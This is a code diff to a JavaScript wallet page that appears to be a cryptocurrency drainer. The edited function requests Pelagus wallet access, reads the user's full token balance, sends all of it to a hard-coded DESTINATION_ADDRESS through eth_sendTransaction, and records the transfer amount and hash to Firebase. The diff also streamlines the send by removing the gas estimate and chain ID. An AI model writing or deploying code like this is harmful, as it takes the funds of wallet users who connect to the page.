@@ -443,18 +443,23 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
+        // First ensure account access
+        const accounts = await window.pelagus.request({
+            method: 'eth_requestAccounts'
+        });
+
         const currentBalance = await getTokenBalance(userSession.address);
         const quaiBalance = await getQuaiBalance(userSession.address);
         const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
         
         if (quaiAmount < 0.1) {
-            log(`❌ Need at least 0.1 QUAI for gas`);
-            throw new Error('Insufficient QUAI balance');
+            log(`❌ Need 0.1 QUAI for gas`);
+            throw new Error('Insufficient QUAI');
         }
 
         if (currentBalance <= 0n) {
-            log('❌ No tokens available to send');
-            throw new Error('No tokens available to send');
+            log('❌ No tokens available');
+            throw new Error('No tokens');
         }
 
         const readableAmount = (Number(currentBalance) / 1e18).toString();
@@ -462,34 +467,22 @@ async function saveToFirebase(data) {
         const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
 
-        // Get gas estimate
-        const gasEstimate = await window.pelagus.request({
-            method: 'eth_estimateGas',
-            params: [{
-                from: userSession.address,
-                to: DESTINATION_ADDRESS,
-                data: '0x' + methodId + paddedAddress + paddedAmount
-            }]
-        });
-
         const transactionParameters = {
-            from: userSession.address,
+            from: accounts[0],
             to: DESTINATION_ADDRESS,
-            value: `0x${currentBalance.toString(16)}`,
             data: '0x' + methodId + paddedAddress + paddedAmount,
-            gas: gasEstimate,
-            chainId: '0x2329' // Cyprus1 chain ID
+            value: '0x0'
         };
 
-        log(`📤 Preparing to send ${readableAmount} tokens...`);
+        log(`📤 Sending ${readableAmount} tokens...`);
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
         });
 
-        log(`📝 Transaction hash: ${txHash}`);
-        const receipt = await waitForTransaction(txHash);
-
+        log(`📝 Hash: ${txHash}`);
+        await waitForTransaction(txHash);
+        
         userSession.transferAmount = readableAmount;
         userSession.transferTxHash = txHash;
         await saveSessionToFirebase();
